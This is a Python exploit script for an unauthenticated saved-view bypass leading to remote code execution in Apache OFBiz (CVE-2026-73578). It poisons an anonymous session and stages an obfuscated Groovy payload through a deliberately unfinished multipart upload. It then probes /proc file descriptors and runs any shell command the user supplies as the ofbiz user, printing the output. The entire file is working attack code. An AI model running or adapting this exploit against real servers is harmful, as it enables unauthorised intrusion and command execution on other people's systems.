#!/usr/bin/env python3
"""Apache OFBiz unauthenticated saved-view bypass to RCE (CVE-2026-73578).

RequestHandler stores an attacker-chosen _LAST_VIEW_NAME_ and its request data in the
anonymous session, even while rendering the login page after a protected request fails.
A public view-last route (setSessionLocale) then replays that view without re-checking the
authentication policy of the route it belongs to, and the restored request attributes
choose the widget file the view loads its decorator from. Staging that widget inside a live
multipart upload and pointing the attribute at the JVM's descriptor table runs Groovy as
the ofbiz user. Linux target with streaming ingress; fixed in Apache OFBiz 24.09.08.
"""

import argparse
import base64
import html
import os
import re
import secrets
import socket
import ssl
import sys
import threading

import requests

BOOTSTRAP = "/facility/control/main?visualThemeId=COMMON"
INTENDED = "/facility/control/EditShipmentRouteSegments"
# POISON stores an authenticated view in the anonymous session; TRIGGER later replays that state.
POISON = "/facility/control/main"
TRIGGER = "/facility/control/setSessionLocale"
UPLOAD = "/facility/control/ListLocales"
VIEW_NAME = "EditShipmentRouteSegments"
LOCATION_PARAM = "commonShipmentDecoratorLocation"
FD_ROOT = "/proc/thread-self/fd"
PAD = 1_200_000

# --- terminal UI ---
_BANNER = r"""
  ___  _____ ____ ___ _____
 / _ \|  ___| __ )_ _|__  /
| | | | |_  |  _ \| |  / /
| |_| |  _| | |_) | | / /_
 \___/|_|   |____/___/____|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code, text):
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def banner(subtitle):
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg): sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")
def good(msg): sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")
def warn(msg): sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")
def bad(msg): sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")
def die(msg): bad(msg); sys.exit(1)


def output(data, label):
    good(label)
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
    sys.stdout.buffer.write(data if data.endswith(b"\n") else data + b"\n")
    sys.stdout.buffer.flush()
# --- end terminal UI ---


def screen_document(marker, command):
    """A decorator screen whose action runs the command and frames its output."""
    # Hex-encoding carries arbitrary command bytes safely through Groovy embedded in XML.
    groovy = (
        "def c=Class.forName('ja'+'va.lang.Pro'+'cessBuilder');"
        f"def z=new String('{command.encode().hex()}'.decodeHex(),'UTF-8');"
        "def a=['/bin/sh','-c',z];"
        "def p=c.getConstructor(Class.forName('ja'+'va.util.List')).newInstance(a);"
        "p.redirectErrorStream(true);def q=p.start();q.outputStream.close();"
        "def o=new ByteArrayOutputStream();q.inputStream.transferTo(o);def e=q.waitFor();"
        f"return '{marker}:'+e.toString()+':'+o.toByteArray().encodeBase64().toString()+':{marker}_END'"
    )
    xml = (f'<?xml version="1.0" encoding="UTF-8"?>\n'
           f'<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
           f'         xmlns="http://ofbiz.apache.org/Widget-Screen"\n'
           f'         xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd">\n'
           f'  <screen name="CommonShipmentDecorator">\n    <section>\n      <actions>\n'
           f'        <set field="r" value="&#36;{{groovy:{html.escape(groovy, quote=True)}}}"/>\n'
           f'      </actions>\n      <widgets><label text="&#36;{{r}}"/></widgets>\n'
           f'    </section>\n  </screen>\n</screens>\n').encode()
    # Force Commons FileUpload to spool the unfinished part to disk rather than retain it in memory.
    return xml + b" " * (PAD - len(xml))


class HeldUpload:
    """POST a multipart body one byte short of its declared length, holding the spool file open."""
    def __init__(self, host, port, verify, screen):
        boundary = "OFBIZ" + secrets.token_hex(12).upper()
        head = (f"--{boundary}\r\n"
                'Content-Disposition: form-data; name="uploadedFile"; filename="screen.xml"\r\n'
                "Content-Type: application/octet-stream\r\n\r\n").encode()
        # No closing boundary: the part stays unterminated so Commons FileUpload keeps the
        # disk-spooled temp file open (readable through /proc/.../fd) during the scan.
        body = head + screen
        self._request = (
            f"POST {UPLOAD} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body) + 1}\r\nConnection: close\r\n\r\n").encode() + body
        self._host, self._port, self._verify = host, port, verify
        self._release = threading.Event()
        self._thread = threading.Thread(target=self._run, daemon=True)

    def _run(self):
        ctx = ssl.create_default_context()
        if not self._verify:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        try:
            self._sock = ctx.wrap_socket(socket.create_connection((self._host, self._port), timeout=30),
                                         server_hostname=self._host)
            # Deliberately withhold the declared final byte until descriptor probing is complete.
            self._sock.sendall(self._request)
            self._release.wait()
            self._sock.sendall(b" ")
        except OSError:
            pass

    def __enter__(self):
        self._thread.start()
        return self

    def __exit__(self, *exc):
        self._release.set()


def frame(body, marker):
    # A complete marker/exit-status/base64 frame distinguishes execution from an ordinary error page.
    m = re.search(re.escape(marker) + r":(-?\d+):([A-Za-z0-9+/]*={0,2}):" + re.escape(marker) + "_END",
                  html.unescape(body))
    return (int(m.group(1)), base64.b64decode(m.group(2))) if m else None


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n  %(prog)s https://target:8443 -c id --fd-min 200 --fd-max 600\n")
    ap.add_argument("target", metavar="URL", help="OFBiz HTTPS origin, e.g. https://host:8443")
    ap.add_argument("-c", "--command", default="id", metavar="CMD", help="command to run (default: id)")
    ap.add_argument("--fd-min", type=int, default=200, metavar="N", help="lowest descriptor to probe (default: 200)")
    ap.add_argument("--fd-max", type=int, default=600, metavar="N", help="highest descriptor to probe (default: 600)")
    ap.add_argument("--verify-tls", action="store_true", help="verify TLS (off by default; OFBiz ships self-signed certs)")
    ap.add_argument("--no-color", action="store_true", help="disable coloured output")
    args = ap.parse_args()
    if args.no_color:
        globals()["_COLOR"] = False

    banner("saved-view bypass to RCE  ·  CVE-2026-73578")
    warn("command execution is at-least-once; use an idempotent command")
    base = args.target.rstrip("/")
    host = re.sub(r"^https?://", "", base).split("/")[0]
    hostname, _, port = host.partition(":")
    port = int(port or 443)
    marker = "OFBIZ_" + secrets.token_hex(8).upper()

    session = requests.Session()
    session.verify = args.verify_tls
    if not args.verify_tls:
        requests.packages.urllib3.disable_warnings()

    boot = session.get(base + BOOTSTRAP, timeout=15, allow_redirects=False)
    info(f"Bootstrap response: HTTP {boot.status_code}")
    if session.cookies:
        good("Anonymous session cookie obtained")
    headers = {"X-Requested-With": "XMLHttpRequest"}
    m = re.search(r'name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)', boot.text, re.I)
    if m:
        good(f"Anonymous AJAX CSRF token obtained ({len(m.group(1))} characters)")
        headers["X-CSRF-Token"] = m.group(1)

    # Establish the negative control: direct access to the saved view must still require authentication.
    direct = session.post(base + INTENDED, data={}, headers=headers, timeout=15, allow_redirects=False)
    info(f"Intended {INTENDED} route: HTTP {direct.status_code}")
    if direct.status_code != 401:
        warn("expected HTTP 401 from the intended authenticated route")

    info(f"Staging {PAD:,}-byte screen through {UPLOAD}")
    # Hold the upload open so its disk-spooled file remains reachable while descriptors are scanned.
    with HeldUpload(hostname, port, args.verify_tls, screen_document(marker, args.command)):
        threading.Event().wait(1.5)
        for fd in range(args.fd_max, args.fd_min - 1, -1):
            loc = f"file:{FD_ROOT}/{fd}#{marker}_{fd}"
            poison = session.get(base + POISON, timeout=15, allow_redirects=False, params={
                "visualThemeId": "COMMON", "_LAST_VIEW_NAME_": VIEW_NAME, LOCATION_PARAM: loc})
            if poison.status_code != 401:
                continue
            # The public locale action dispatches the session's last view with the poisoned attributes restored.
            trigger = session.post(base + TRIGGER, data={"newLocale": "en"}, headers=headers,
                                   timeout=20, allow_redirects=False)
            hit = frame(trigger.text, marker)
            if hit:
                exit_status, out = hit
                good(f"Anonymous saved-view state loaded the staged screen through {FD_ROOT}/{fd}")
                good(f"Poison response was HTTP {poison.status_code}; view-last trigger was HTTP {trigger.status_code}")
                good("Intended route remained protected while saved-view dispatch succeeded")
                good(f"Remote command exit status: {exit_status}")
                output(out, "command output")
                return
    die("no staged screen descriptor was found in the requested range")


if __name__ == "__main__":
    try:
        main()
    except requests.RequestException as e:
        die(f"request failed: {e}")
    except KeyboardInterrupt:
        sys.exit(130)
